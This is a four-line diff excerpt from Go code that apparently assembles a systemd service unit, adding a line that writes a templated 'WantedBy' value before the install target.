+	svc.WriteString(getVal(tplWantedBy))
 	svc.WriteString(target)
 	svc.WriteString("\n")
 
